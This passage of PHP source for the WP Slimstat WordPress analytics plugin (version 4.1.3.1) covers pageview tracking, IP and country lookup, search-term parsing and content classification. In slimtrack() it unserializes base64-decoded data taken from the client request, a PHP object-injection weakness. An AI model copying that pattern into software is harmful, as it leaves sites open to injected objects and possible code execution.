<?php
/*
Plugin Name: WP Slimstat
Plugin URI: http://wordpress.org/plugins/wp-slimstat/
Description: The leading web analytics plugin for WordPress
Version: 4.1.3.1
Author: Camu
Author URI: http://www.wp-slimstat.com/
*/
 
if ( !empty( wp_slimstat::$options ) ) return true;

class wp_slimstat {
	public static $version = '4.1.3.1';
	public static $options = array();

	public static $wpdb = '';
	public static $maxmind_path = '';

	protected static $data_js = array( 'id' => 0 );
	protected static $stat = array();
	protected static $options_signature = '';
	
	protected static $browser = array();
	protected static $heuristic_key = 0;
	protected static $pidx = array( 'id' => false, 'response' => '' );

	/**
	 * Initializes variables and actions
	 */
	public static function init(){

		// Load all the settings
		self::$options = ( is_network_admin() && ( empty($_GET[ 'page' ] ) || strpos( $_GET[ 'page' ], 'wp-slim-view' ) === false ) ) ? get_site_option( 'slimstat_options', array() ) : get_option( 'slimstat_options', array() );
		self::$options = array_merge( self::init_options(), self::$options );

		// Allow third party tools to edit the options
		self::$options = apply_filters('slimstat_init_options', self::$options);

		// Determine the options' signature: if it hasn't changed, there's no need to update/save them in the database
		self::$options_signature = md5(serialize(self::$options));
		
		// Allow third-party tools to use a custom database for Slimstat
		self::$wpdb = apply_filters('slimstat_custom_wpdb', $GLOBALS['wpdb']);

		// Add a menu to the admin bar ( this function is declared here and not in wp_slimstat_admin because the latter is only initialized if is_admin(), and not in the front-end )
		if (self::$options['use_separate_menu'] != 'yes' && is_admin_bar_showing()){
			add_action('admin_bar_menu', array(__CLASS__, 'wp_slimstat_adminbar'), 100);
		}

		// Hook a DB clean-up routine to the daily cronjob
		add_action('wp_slimstat_purge', array(__CLASS__, 'wp_slimstat_purge'));

		// Allow external domains on CORS requests
		add_filter('allowed_http_origins', array(__CLASS__, 'open_cors_admin_ajax'));

		// Define the folder where to store the geolocation database
		self::$maxmind_path = apply_filters('slimstat_maxmind_path', wp_upload_dir());
		self::$maxmind_path = self::$maxmind_path['basedir'].'/wp-slimstat/maxmind.dat';

		// Enable the tracker (both server- and client-side)
		if (!is_admin() || self::$options['track_admin_pages'] == 'yes'){
			// Allow add-ons to turn off the tracker based on other conditions
			$is_tracking_filter = apply_filters('slimstat_filter_pre_tracking', true);
			$is_tracking_filter_js = apply_filters('slimstat_filter_pre_tracking_js', true);

			$action_to_hook = is_admin()?'admin_init':'wp';

			// Is server-side tracking active?
			if (self::$options['javascript_mode'] != 'yes' && self::$options['is_tracking'] == 'yes' && $is_tracking_filter){
				add_action($action_to_hook, array(__CLASS__, 'slimtrack'), 5);
				if (self::$options['track_users'] == 'yes'){
					add_action('login_init', array(__CLASS__, 'slimtrack'), 10);
				}
			}

			// Slimstat tracks screen resolutions, outbound links and other client-side information using javascript
			if ((self::$options['enable_javascript'] == 'yes' || self::$options['javascript_mode'] == 'yes') && self::$options['is_tracking'] == 'yes' && $is_tracking_filter_js){
				add_action($action_to_hook, array(__CLASS__, 'wp_slimstat_enqueue_tracking_script'), 15);
				if (self::$options['track_users'] == 'yes'){
					add_action('login_enqueue_scripts', array(__CLASS__, 'wp_slimstat_enqueue_tracking_script'), 10);
				}
			}

			if (self::$options['enable_ads_network'] == 'yes'){
				add_filter('the_content', array(__CLASS__, 'print_code'));
			}
		}

		// Shortcodes
		add_shortcode('slimstat', array(__CLASS__, 'slimstat_shortcode'), 15);

		// Update the options before shutting down
		add_action('shutdown', array(__CLASS__, 'slimstat_save_options'), 100);
	}
	// end init

	/**
	 * Ajax Tracking
	 */
	public static function slimtrack_ajax(){
		// This function also initializes self::$data_js and removes the checksum from self::$data_js['id']
		self::_check_data_integrity($_REQUEST);

		// Is this a request to record a new pageview?
		if (self::$data_js['op'] == 'add' || empty(self::$data_js['pos'])){

			// Track client-side information (screen resolution, plugins, etc)
			if (!empty(self::$data_js['bw'])){
				self::$stat['resolution'] = strip_tags(trim(self::$data_js['bw'].'x'.self::$data_js['bh']));
			}
			if (!empty(self::$data_js['sw'])){
				self::$stat['screen_width'] = intval(self::$data_js['sw']);
			}
			if (!empty(self::$data_js['sh'])){
				self::$stat['screen_height'] = intval(self::$data_js['sh']);
			}
			if (!empty(self::$data_js['pl'])){
				self::$stat['plugins'] = strip_tags(trim(self::$data_js['pl']));
			}
			if (!empty(self::$data_js['sl']) && self::$data_js['sl'] > 0 && self::$data_js['sl'] < 60000){
				self::$stat['server_latency'] = intval(self::$data_js['sl']);
			}
			if (!empty(self::$data_js['pp']) && self::$data_js['pp'] > 0 && self::$data_js['pp'] < 60000){
				self::$stat['page_performance'] = intval(self::$data_js['pp']);
			}
		}

		if ( self::$data_js['op'] == 'add' ){
			self::slimtrack();
		}
		else{
			// Update an existing pageview with client-based information (resolution, plugins installed, etc)
			self::_set_visit_id( true );

			// ID of the pageview to update
			self::$stat[ 'id' ] = abs( intval( self::$data_js[ 'id' ] ) );

			// Are we tracking an outbound click?
			if (!empty(self::$data_js['res'])){
				self::$stat['outbound_resource'] = strip_tags(trim(base64_decode(self::$data_js['res'])));
			}

			self::_update_row(self::$stat, $GLOBALS['wpdb']->prefix.'slim_stats');
		}

		// Was this pageview tracked?
		if ( self::$stat[ 'id' ] <= 0 ){
			$abs_error_code = abs(self::$stat['id']);
			switch ($abs_error_code){
				case '212':
					do_action('slimstat_track_exit_'.$abs_error_code, self::$stat, $browser);
					break;
				default:
					do_action('slimstat_track_exit_'.$abs_error_code, self::$stat);
			}
			self::slimstat_save_options();
			exit(self::$stat['id'].'.0');
		}

		// Is an event associated to this request?
		if (!empty(self::$data_js['pos'])){
			$event_info = array(
				'position' => strip_tags(trim(self::$data_js['pos'])),
				'id' => self::$stat['id'],
				'dt' => date_i18n('U')
			);
			
			if (!empty(self::$data_js['ty'])){
				$event_info['type'] = abs(intval(self::$data_js['ty']));
			}
			if (!empty(self::$data_js['des'])){
				$event_info['event_description'] = strip_tags(trim(base64_decode(self::$data_js['des'])));
			}
			if (!empty(self::$data_js['no'])){
				$event_info['notes'] = strip_tags(trim(base64_decode(self::$data_js['no'])));
			}

			self::_insert_row($event_info, $GLOBALS['wpdb']->prefix.'slim_events');
		}

		// Send the ID back to Javascript to track future interactions
		do_action('slimstat_track_success');
		
		// If we tracked an internal download, we return the original ID, not the new one
		if (self::$data_js['op'] == 'add' && !empty(self::$data_js['pos'])){
			exit(self::$data_js['id'].'.'.md5(self::$data_js['id'].self::$options['secret']));
		}
		else{
			exit(self::$stat['id'].'.'.md5(self::$stat['id'].self::$options['secret']));
		}
	}

	/**
	 * Core tracking functionality
	 */
	public static function slimtrack($_argument = ''){
		self::$stat['dt'] = date_i18n('U');
		self::$stat['notes'] = array();

		// Allow third-party tools to initialize the stat array
		self::$stat = apply_filters('slimstat_filter_pageview_stat_init', self::$stat);

		// Third-party tools can decide that this pageview should not be tracked, by setting its datestamp to zero
		if ( empty( self::$stat ) || empty( self::$stat[ 'dt' ] ) ) {
			self::$stat[ 'id' ] = -213;
			self::_set_error_array( __( 'Pageview filtered by third-party code', 'wp-slimstat' ) );
			return $_argument;
		}

		if (!empty(self::$data_js['ref'])){
			self::$stat['referer'] = base64_decode(self::$data_js['ref']);
		}
		else if (!empty($_SERVER['HTTP_REFERER'])){
			self::$stat['referer'] = $_SERVER['HTTP_REFERER'];
		}

		if ( !empty( self::$stat[ 'referer' ] ) ) {
		
			// Is this a 'seriously malformed' URL?
			$referer = parse_url( self::$stat[ 'referer' ] );
			if ( !$referer ){
				self::$stat[ 'id' ] = -208;
				self::_set_error_array( __( 'Malformed URL', 'wp-slimstat' ) );
				return $_argument;
			}

			// Fix Google Images referring domain
			if ( strpos(self::$stat[ 'referer' ], 'www.google' ) !== false ) { 
				if ( strpos( self::$stat[ 'referer' ], '/imgres?' ) !== false ) {
					self::$stat[ 'referer' ] = str_replace( 'www.google', 'images.google', self::$stat[ 'referer' ] );
				}
				if ( strpos( self::$stat[ 'referer' ], '/url?' ) !== false ) {
					self::$stat[ 'referer' ] = str_replace( '/url?', '/search?', self::$stat[ 'referer' ] );
				}
			}

			// Is this referer blacklisted?
			foreach(self::string_to_array(self::$options['ignore_referers']) as $a_filter){
				$pattern = str_replace( array('\*', '\!') , array('(.*)', '.'), preg_quote($a_filter, '/'));
				if (preg_match("@^$pattern$@i", self::$stat['referer'])){
					self::$stat[ 'id' ] = -207;
					self::_set_error_array( __( 'Referrer is blacklisted', 'wp-slimstat') );
					return $_argument;
				}
			}
		}

		$content_info = self::_get_content_info();

		// Did we receive data from an Ajax request?
		if ( !empty( self::$data_js['id'] ) ) {

			// Are we tracking a new pageview? (pos is empty = no event was triggered)
			if ( empty( self::$data_js[ 'pos' ] ) ) {
				$content_info = unserialize( base64_decode( self::$data_js[ 'id' ] ) );
				if ( $content_info === false || empty( $content_info[ 'content_type' ] ) ) {
					$content_info = array();
				}
			}
			
			// If pos is not empty and slimtrack was called, it means we are tracking a new internal download
			else if ( !empty( self::$data_js[ 'res' ] ) ) {
				$download_url = base64_decode( self::$data_js[ 'res' ] );
				if ( is_string( $download_url ) ) {
					$download_extension = pathinfo( $download_url, PATHINFO_EXTENSION );
					if ( in_array( $download_extension, self::string_to_array( self::$options[ 'extensions_to_track' ] ) ) ) {
						unset( self::$stat[ 'id' ] );
						$content_info = array( 'content_type' => 'download' );
					}
				}
			}

		}

		self::$stat = self::$stat + $content_info;

		// We want to record both hits and searches (performed through the site search form)
		if (self::$stat['content_type'] == 'external'){
			self::$stat['resource'] = $_SERVER['HTTP_REFERER'];
			self::$stat['referer'] = '';
		}
		else if (is_array(self::$data_js) && isset(self::$data_js['res'])){

			$parsed_permalink = parse_url(base64_decode(self::$data_js['res']));
			self::$stat['searchterms'] = self::_get_search_terms($referer);

			// Was this an internal search?
			if (empty(self::$stat['searchterms'])){
				self::$stat['searchterms'] = self::_get_search_terms( $parsed_permalink );
			}

			self::$stat['resource'] = !is_array($parsed_permalink)?self::$data_js['res']:$parsed_permalink['path'].(!empty($parsed_permalink['query'])?'?'.urldecode($parsed_permalink['query']):'');
		}
		elseif ( empty( $_REQUEST[ 's' ] ) ) {
			if ( !empty( $referer ) ) {
				self::$stat[ 'searchterms' ] = self::_get_search_terms( $referer );
			}
			self::$stat[ 'resource' ] = self::get_request_uri();
		}
		else{
			self::$stat[ 'searchterms' ] = str_replace( '\\', '', $_REQUEST[ 's' ] );
		}

		// Don't store empty values in the database
		if ( empty( self::$stat['searchterms'] ) ) {
			unset( self::$stat['searchterms'] );
		}

		// Do not track report pages in the admin
		if ( ( !empty( self::$stat[ 'resource' ] ) && strpos( self::$stat[ 'resource' ], 'wp-admin/admin-ajax.php' ) !== false ) || ( !empty( $_GET[ 'page' ] ) && strpos( $_GET[ 'page' ], 'wp-slim-view' ) !== false ) ) {
			return $_argument;
		}

		// Is this resource blacklisted?
		if (!empty(self::$stat['resource'])){
			foreach(self::string_to_array(self::$options['ignore_resources']) as $a_filter){
				$pattern = str_replace( array('\*', '\!') , array('(.*)', '.'), preg_quote($a_filter, '/'));
				if (preg_match("@^$pattern$@i", self::$stat['resource'])){
					self::$stat['id'] = -209;
					self::_set_error_array( __( 'Permalink is blacklisted', 'wp-slimstat' ) );
					return $_argument;
				}
			}
		}

		// User's IP address
		list ( self::$stat[ 'ip' ], self::$stat[ 'other_ip' ] ) = self::_get_remote_ip();

		if ( empty( self::$stat[ 'ip' ] ) || self::$stat[ 'ip' ] == '0.0.0.0' ) {
			self::$stat[ 'id' ] = -203;
			self::_set_error_array( __( 'Empty or not supported IP address format (IPv6)', 'wp-slimstat' ) );
			return $_argument;
		}

		// Should we ignore this user?
		if ( !empty( $GLOBALS[ 'current_user' ]->ID ) ) {
			// Don't track logged-in users, if the corresponding option is enabled
			if (self::$options['track_users'] == 'no'){
				self::$stat['id'] = -214;
				self::_set_error_array( __( 'Logged in user not tracked', 'wp-slimstat' ) );
				return $_argument;
			}

			// Don't track users with given capabilities
			foreach(self::string_to_array(self::$options['ignore_capabilities']) as $a_capability){
				if (array_key_exists(strtolower($a_capability), $GLOBALS['current_user']->allcaps)){
					self::$stat['id'] = -200;
					self::_set_error_array( __( 'User with given capability not tracked', 'wp-slimstat' ) );
					return $_argument;
				}
			}

			if (is_string(self::$options['ignore_users']) && strpos(self::$options['ignore_users'], $GLOBALS['current_user']->data->user_login) !== false){
				self::$stat['id'] = -201;
				self::_set_error_array( sprintf( __('User %s is blacklisted', 'wp-slimstat'), $GLOBALS['current_user']->data->user_login ) );
				return $_argument;
			}

			self::$stat['username'] = $GLOBALS['current_user']->data->user_login;
			self::$stat['notes'][] = 'user:'.$GLOBALS['current_user']->data->ID;
			$not_spam = true;
		}
		elseif (isset($_COOKIE['comment_author_'.COOKIEHASH])){
			// Is this a spammer?
			$spam_comment = self::$wpdb->get_row( self::$wpdb->prepare( "
				SELECT comment_author, COUNT(*) comment_count
				FROM {$GLOBALS['wpdb']->prefix}comments
				WHERE comment_author_IP = %s AND comment_approved = 'spam'
				GROUP BY comment_author
				LIMIT 0,1", self::$stat[ 'ip' ] ), ARRAY_A );

			if ( !empty( $spam_comment[ 'comment_count' ] ) ) {
				if ( self::$options[ 'ignore_spammers' ] == 'yes' ){
					self::$stat[ 'id' ] = -202;
					self::_set_error_array( sprintf( __( 'Spammer %s not tracked', 'wp-slimstat' ), $spam_comment[ 'comment_author' ] ) );
					return $_argument;
				}
				else{
					self::$stat['notes'][] = 'spam:yes';
					self::$stat['username'] = $spam_comment['comment_author'];
				}
			}
			else
				self::$stat['username'] = $_COOKIE['comment_author_'.COOKIEHASH];
		}

		// Should we ignore this IP address?
		foreach ( self::string_to_array( self::$options[ 'ignore_ip' ] ) as $a_ip_range ) {
			$ip_to_ignore = $a_ip_range;

			if ( strpos( $ip_to_ignore, '/' ) !== false ) {
				list( $ip_to_ignore, $cidr_mask ) = explode( '/', trim( $ip_to_ignore ) );
			}
			else{
				$cidr_mask = self::_get_mask_length( $ip_to_ignore );
			}

			$long_masked_ip_to_ignore = substr( self::_dtr_pton( $ip_to_ignore ), 0, $cidr_mask );
			$long_masked_user_ip = substr( self::_dtr_pton( self::$stat[ 'ip' ] ), 0, $cidr_mask );
			$long_masked_user_other_ip = substr( self::_dtr_pton( self::$stat[ 'other_ip' ] ), 0 , $cidr_mask );

			if ( $long_masked_user_ip === $long_masked_ip_to_ignore || $long_masked_user_other_ip === $long_masked_ip_to_ignore ) {
				self::$stat['id'] = -204;
				self::_set_error_array( sprintf( __('IP address %s is blacklisted', 'wp-slimstat'), self::$stat[ 'ip' ] . ( !empty( self::$stat[ 'other_ip' ] ) ? ' (' . self::$stat[ 'other_ip' ] . ')' : '' ) ) );
				return $_argument;
			}
		}

		// Country and Language
		self::$stat['language'] = self::_get_language();
		self::$stat['country'] = self::get_country(self::$stat[ 'ip' ]);

		// Anonymize IP Address?
		if ( self::$options[ 'anonymize_ip' ] == 'yes' ) {
			// IPv4 or IPv6
			$needle = '.';
			$replace = '.0';
			if ( self::_get_mask_length( self::$stat['ip'] ) == 128 ) {
				$needle = ':';
				$replace = ':0000';
			}

			self::$stat[ 'ip' ] = substr( self::$stat[ 'ip' ], 0, strrpos( self::$stat[ 'ip' ], $needle ) ) . $replace;

			if ( !empty( self::$stat[ 'other_ip' ] ) ) {
				self::$stat[ 'other_ip' ] = substr( self::$stat[ 'other_ip' ], 0, strrpos( self::$stat[ 'other_ip' ], $needle ) ) . $replace;
			}
		}

		// Is this country blacklisted?
		if ( is_string( self::$options[ 'ignore_countries' ] ) && stripos( self::$options[ 'ignore_countries' ], self::$stat[ 'country' ] ) !== false ) {
			self::$stat['id'] = -206;
			self::_set_error_array( sprintf( __('Country %s is blacklisted', 'wp-slimstat'), self::$stat[ 'country' ] ) );
			return $_argument;
		}

		// Mark or ignore Firefox/Safari prefetching requests (X-Moz: Prefetch and X-purpose: Preview)
		if ((isset($_SERVER['HTTP_X_MOZ']) && (strtolower($_SERVER['HTTP_X_MOZ']) == 'prefetch')) ||
			(isset($_SERVER['HTTP_X_PURPOSE']) && (strtolower($_SERVER['HTTP_X_PURPOSE']) == 'preview'))){
			if (self::$options['ignore_prefetch'] == 'yes'){
				self::$stat['id'] = -210;
				self::_set_error_array( __( 'Prefetch requests are ignored', 'wp-slimstat' ) );
				return $_argument;
			}
			else{
				self::$stat['notes'][] = 'pre:yes';
			}
		}

		// Detect user agent
		self::$browser = self::_get_browser();

		// Are we ignoring bots?
		if ((self::$options['javascript_mode'] == 'yes' || self::$options['ignore_bots'] == 'yes') && self::$browser['browser_type']%2 != 0){
			self::$stat['id'] = -211;
			self::_set_error_array( __( 'Bot not tracked', 'wp-slimstat' ) );
			return $_argument;
		}

		// Is this browser blacklisted?
		foreach(self::string_to_array(self::$options['ignore_browsers']) as $a_filter){
			$pattern = str_replace( array('\*', '\!') , array('(.*)', '.'), preg_quote($a_filter, '/'));
			if (preg_match("~^$pattern$~i", self::$browser['browser'].'/'.self::$browser['version']) || preg_match("~^$pattern$~i", self::$browser['browser']) || preg_match("~^$pattern$~i", self::$browser['user_agent'])){
				self::$stat['id'] = -212;
				self::_set_error_array( sprintf( __( 'Browser %s is blacklisted', 'wp-slimstat' ), self::$browser['browser'] ) );
				return $_argument;
			}
		}

		self::$stat = self::$stat + self::$browser;

		// Do we need to assign a visit_id to this user?
		$cookie_has_been_set = self::_set_visit_id(false);

		// Allow third-party tools to modify all the data we've gathered so far
		self::$stat = apply_filters('slimstat_filter_pageview_stat', self::$stat);
		do_action('slimstat_track_pageview', self::$stat);

		// Third-party tools can decide that this pageview should not be tracked, by setting its datestamp to zero
		if (empty(self::$stat) || empty(self::$stat['dt'])){
			self::$stat['id'] = -213;
			self::_set_error_array( __( 'Pageview filtered by third-party code', 'wp-slimstat' ) );
			return $_argument;
		}

		// Implode the notes
		self::$stat['notes'] = implode(';', self::$stat['notes']);

		// Now let's save this information in the database
		self::$stat['id'] = self::_insert_row(self::$stat, $GLOBALS['wpdb']->prefix.'slim_stats');

		// Something went wrong during the insert
		if (empty(self::$stat['id'])){
			self::$stat['id'] = -215;
			self::_set_error_array( self::$wpdb->last_error );

			// Attempt to init the environment (new blog in a MU network?)
			include_once(WP_PLUGIN_DIR.'/wp-slimstat/admin/wp-slimstat-admin.php');
			wp_slimstat_admin::init_environment(true);
			
			return $_argument;
		}

		// Is this a new visitor?
		$is_set_cookie = apply_filters('slimstat_set_visit_cookie', true);
		if ($is_set_cookie){
			$unique_id = get_current_user_id();
			if ( empty( $unique_id ) ) {
				$unique_id = '';
			}
			else {
				$unique_id = '_'.$unique_id;
			}

			if (empty(self::$stat['visit_id']) && !empty(self::$stat['id'])){
				// Set a cookie to track this visit (Google and other non-human engines will just ignore it)
				@setcookie(
					'slimstat_tracking_code' . $unique_id,
					self::$stat[ 'id' ] . 'id.' . md5( self::$stat[ 'id' ] . 'id' . self::$options[ 'secret' ] ),
					time() + 2678400, // one month
					COOKIEPATH
				);
			}
			elseif (!$cookie_has_been_set && self::$options[ 'extend_session' ] == 'yes' && self::$stat[ 'visit_id' ] > 0){
				@setcookie(
				 'slimstat_tracking_code' . $unique_id,
				 self::$stat[ 'visit_id' ] . '.' . md5( self::$stat[ 'visit_id' ] . self::$options[ 'secret' ] ),
				 time() + self::$options[ 'session_duration' ],
				 COOKIEPATH
				);
			}
		}
		return $_argument;
	}
	// end slimtrack

	/**
	 * Searches for the country code associated to a given IP address
	 */
	public static function get_country( $_ip_address = '0.0.0.0' ){
		$float_ipnum = (float)sprintf( "%u", $_ip_address );
		$country_output = 'xx';

		// Is this a RFC1918 (local) IP?
		if ($float_ipnum == 2130706433 || // 127.0.0.1
			($float_ipnum >= 167772160 && $float_ipnum <= 184549375) || // 10.0.0.1 - 10.255.255.255
			($float_ipnum >= 2886729728 && $float_ipnum <= 2887778303) || // 172.16.0.1 - 172.31.255.255
			($float_ipnum >= 3232235521 && $float_ipnum <= 3232301055) ){ // 192.168.0.1 - 192.168.255.255
				$country_output = 'xy';
		}
		else {
			$country_codes = array("","ap","eu","ad","ae","af","ag","ai","al","am","cw","ao","aq","ar","as","at","au","aw","az","ba","bb","bd","be","bf","bg","bh","bi","bj","bm","bn","bo","br","bs","bt","bv","bw","by","bz","ca","cc","cd","cf","cg","ch","ci","ck","cl","cm","cn","co","cr","cu","cv","cx","cy","cz","de","dj","dk","dm","do","dz","ec","ee","eg","eh","er","es","et","fi","fj","fk","fm","fo","fr","sx","ga","gb","gd","ge","gf","gh","gi","gl","gm","gn","gp","gq","gr","gs","gt","gu","gw","gy","hk","hm","hn","hr","ht","hu","id","ie","il","in","io","iq","ir","is","it","jm","jo","jp","ke","kg","kh","ki","km","kn","kp","kr","kw","ky","kz","la","lb","lc","li","lk","lr","ls","lt","lu","lv","ly","ma","mc","md","mg","mh","mk","ml","mm","mn","mo","mp","mq","mr","ms","mt","mu","mv","mw","mx","my","mz","na","nc","ne","nf","ng","ni","nl","no","np","nr","nu","nz","om","pa","pe","pf","pg","ph","pk","pl","pm","pn","pr","ps","pt","pw","py","qa","re","ro","ru","rw","sa","sb","sc","sd","se","sg","sh","si","sj","sk","sl","sm","sn","so","sr","st","sv","sy","sz","tc","td","tf","tg","th","tj","tk","tm","tn","to","tl","tr","tt","tv","tw","tz","ua","ug","um","us","uy","uz","va","vc","ve","vg","vi","vn","vu","wf","ws","ye","yt","rs","za","zm","me","zw","a1","a2","o1","ax","gg","im","je","bl","mf","bq","ss","o1");
			if (file_exists(self::$maxmind_path) && ($handle = fopen(self::$maxmind_path, "rb"))){

				// Do we need to update the file?
				if (false !== ($file_stat = stat(self::$maxmind_path))){
					
					// Is the database more than 30 days old?
					if ((date('U') - $file_stat['mtime'] > 2629740)){
						fclose($handle);

						add_action('shutdown', array(__CLASS__, 'download_maxmind_database'));

						if (false === ($handle = fopen(self::$maxmind_path, "rb"))){
							return apply_filters( 'slimstat_get_country', 'xx', $_ip_address );
						}
					}
				}

				$offset = 0;
				for ($depth = 31; $depth >= 0; --$depth) {
					if (fseek($handle, 6 * $offset, SEEK_SET) != 0){
						break;
					}
					$buf = fread($handle, 6);
					$x = array(0,0);
					for ($i = 0; $i < 2; ++$i) {
						for ($j = 0; $j < 3; ++$j) {
							$x[$i] += ord(substr($buf, 3 * $i + $j, 1)) << ($j * 8);
						}
					}

					if ( !empty( $_ip_address ) & ( 1 << $depth ) ) {
						if ($x[1] >= 16776960 && !empty($country_codes[$x[1] - 16776960])) {
							$country_output = $country_codes[$x[1] - 16776960];
							break;
						}
						$offset = $x[1];
					} else {
						if ($x[0] >= 16776960 && !empty($country_codes[$x[0] - 16776960])) {
							$country_output = $country_codes[$x[0] - 16776960];
							break;
						}
						$offset = $x[0];
					}
				}
				fclose($handle);
			}
		}

		return apply_filters( 'slimstat_get_country', $country_output, $_ip_address );
	}
	// end get_country

	/**
	 * Decodes the permalink
	 */
	public static function get_request_uri(){
		if (isset($_SERVER['REQUEST_URI'])){
			return urldecode($_SERVER['REQUEST_URI']);
		}
		elseif (isset($_SERVER['SCRIPT_NAME'])){
			return isset($_SERVER['QUERY_STRING'])?$_SERVER['SCRIPT_NAME']."?".$_SERVER['QUERY_STRING']:$_SERVER['SCRIPT_NAME'];
		}
		else{
			return isset($_SERVER['QUERY_STRING'])?$_SERVER['PHP_SELF']."?".$_SERVER['QUERY_STRING']:$_SERVER['PHP_SELF'];
		}
	}
	// end get_request_uri

	/**
	 * Tries to find the user's REAL IP address
	 */
	protected static function _get_remote_ip(){
		$ip_array = array( '', '' );

		if ( !empty( $_SERVER[ 'REMOTE_ADDR' ] ) && filter_var( $_SERVER[ 'REMOTE_ADDR' ], FILTER_VALIDATE_IP ) !== false ) {
			$ip_array[ 0 ] = $_SERVER["REMOTE_ADDR"];
		}

		if ( !empty( $_SERVER[ 'HTTP_CLIENT_IP' ] ) && filter_var( $_SERVER[ 'HTTP_CLIENT_IP' ], FILTER_VALIDATE_IP ) !== false ) {
			$ip_array[ 1 ] = $_SERVER["HTTP_CLIENT_IP"];
		}

		if ( !empty( $_SERVER[ 'HTTP_X_FORWARDED_FOR' ] ) ) {
			foreach ( explode( ',', $_SERVER[ 'HTTP_X_FORWARDED_FOR' ] ) as $a_ip ) {
				if ( filter_var( $a_ip, FILTER_VALIDATE_IP ) !== false ) {
					$ip_array[ 1 ] = $a_ip;
					break;
				}
			}
		}

		if ( !empty( $_SERVER[ 'HTTP_FORWARDED' ] ) && filter_var( $_SERVER[ 'HTTP_FORWARDED' ], FILTER_VALIDATE_IP ) !== false ) {
			$ip_array[ 1 ] = $_SERVER[ 'HTTP_FORWARDED' ];
		}

		if ( !empty( $_SERVER[ 'HTTP_X_FORWARDED' ] ) && filter_var( $_SERVER[ 'HTTP_X_FORWARDED' ], FILTER_VALIDATE_IP ) !== false ) {
			$ip_array[ 1 ] = $_SERVER[ 'HTTP_X_FORWARDED' ];
		}

		return $ip_array;
	}
	// end _get_remote_ip

	/**
	 * Extracts the accepted language from browser headers
	 */
	protected static function _get_language(){
		if(isset($_SERVER["HTTP_ACCEPT_LANGUAGE"])){

			// Capture up to the first delimiter (, found in Safari)
			preg_match("/([^,;]*)/", $_SERVER["HTTP_ACCEPT_LANGUAGE"], $array_languages);

			// Fix some codes, the correct syntax is with minus (-) not underscore (_)
			return str_replace( "_", "-", strtolower( $array_languages[0] ) );
		}
		return 'xx';  // Indeterminable language
	}
	// end _get_language

	/**
	 * Sniffs out referrals from search engines and tries to determine the query string
	 */
	protected static function _get_search_terms($_url = array()){
		if (empty($_url) || !isset($_url['host']) || !isset($_url['query']) || strpos($_url['host'], 'facebook') !== false) return '';

		$query_formats = array('daum' => 'q', 'eniro' => 'search_word', 'naver' => 'query', 'google' => 'q', 'www.google' => 'as_q', 'yahoo' => 'p', 'msn' => 'q', 'bing' => 'q', 'aol' => 'query', 'lycos' => 'q', 'ask' => 'q', 'cnn' => 'query', 'about' => 'q', 'mamma' => 'q', 'voila' => 'rdata', 'virgilio' => 'qs', 'baidu' => 'wd', 'yandex' => 'text', 'najdi' => 'q', 'seznam' => 'q', 'search' => 'q', 'onet' => 'qt', 'yam' => 'k', 'pchome' => 'q', 'kvasir' => 'q', 'mynet' => 'q', 'nova_rambler' => 'words');
		$charsets = array('baidu' => 'EUC-CN');

		parse_str($_url['query'], $query);
		preg_match("/(daum|eniro|naver|google|www.google|yahoo|msn|bing|aol|lycos|ask|cnn|about|mamma|voila|virgilio|baidu|yandex|najdi|seznam|search|onet|yam|pchome|kvasir|mynet|rambler)./", $_url['host'], $matches);

		if (isset($matches[1]) && isset($query[$query_formats[$matches[1]]])){
			// Test for encodings different from UTF-8
			if (function_exists('mb_check_encoding') && !mb_check_encoding($query[$query_formats[$matches[1]]], 'UTF-8') && !empty($charsets[$matches[1]]))
				return mb_convert_encoding(urldecode($query[$query_formats[$matches[1]]]), 'UTF-8', $charsets[$matches[1]]);

			return str_replace('\\', '', trim(urldecode($query[$query_formats[$matches[1]]])));
		}

		// We weren't lucky, but there's still hope
		foreach(array('q','s','k','qt') as $a_format)
			if (isset($query[$a_format])){
				return str_replace('\\', '', trim(urldecode($query[$a_format])));
			}

		return '';
	}
	// end _get_search_terms

	/**
	 * Returns details about the resource being accessed
	 */
	protected static function _get_content_info(){
		$content_info = array('content_type' => 'unknown');

		// Mark 404 pages
		if (is_404()){
			$content_info['content_type'] = '404';
		}

		// Type
		elseif (is_single()){
			if (($post_type = get_post_type()) != 'post') $post_type = 'cpt:'.$post_type;
			$content_info['content_type'] = $post_type;
			$content_info_array = array();
			foreach (get_object_taxonomies($GLOBALS['post']) as $a_taxonomy){
				$terms = get_the_terms($GLOBALS['post']->ID, $a_taxonomy);
				if (is_array($terms)){
					foreach ($terms as $a_term) $content_info_array[] = $a_term->term_id;
					$content_info['category'] = implode(',', $content_info_array);
				}
			}
			$content_info['content_id'] = $GLOBALS['post']->ID;
		}
		elseif (is_page()){
			$content_info['content_type'] = 'page';
			$content_info['content_id'] = $GLOBALS['post']->ID;
		}
		elseif (is_attachment()){
			$content_info['content_type'] = 'attachment';
		}
		elseif (is_singular()){
			$content_info['content_type'] = 'singular';
		}
		elseif (is_post_type_archive()){
			$content_info['content_type'] = 'post_type_archive';
		}
		elseif (is_tag()){
			$content_info['content_type'] = 'tag';
			$list_tags = get_the_tags();
			if (is_array($list_tags)){
				$tag_info = array_pop($list_tags);
				if (!empty($tag_info)) $content_info['category'] = "$tag_info->term_id";
			}
		}
		elseif (is_tax()){
			$content_info['content_type'] = 'taxonomy';
		}
		elseif (is_category()){
			$content_info['content_type'] = 'category';
			$list_categories = get_the_category();
			if (is_array($list_categories)){
				$cat_info = array_pop($list_categories);
				if (!empty($cat_info)) $content_info['category'] = "$cat_info->term_id";
			}
		}
		elseif (is_date()){
			$content_info['content_type']= 'date';
		}
		elseif (is_author()){
			$content_info['content_type'] = 'author';
		}
		elseif (is_archive()){
			$content_info['content_type'] = 'archive';
		}
		elseif (is_search()){
			$content_info['content_type'] = 'search';
		}
		elseif (is_feed()){
			$content_info['content_type'] = 'feed';
		}
		elseif ( is_home() || is_front_page() ){
			$content_info['content_type'] = 'home';
		}
		elseif ( !empty( $GLOBALS['pagenow'] ) && $GLOBALS['pagenow'] == 'wp-login.php' ) {
			$content_info['content_type'] = 'login';
		}
		elseif ( !empty( $GLOBALS['pagenow'] ) && $GLOBALS['pagenow'] == 'wp-register.php' ) {
			$content_info['content_type'] = 'registration';
		}
		// WordPress sets is_admin() to true for all ajax requests ( front-end or admin-side )
		elseif ( is_admin() && ( !defined('DOING_AJAX') || !DOING_AJAX ) ) {
			$content_info['content_type'] = 'admin';
		}

		if (is_paged()){
			$content_info['content_type'] .= ',paged';
		}

		// Author
		if (is_singular()){
			$content_info['author'] = get_the_author_meta('user_login', $GLOBALS['post']->post_author);
		}

		return $content_info;
	}
	// end _get_content_info

	/**
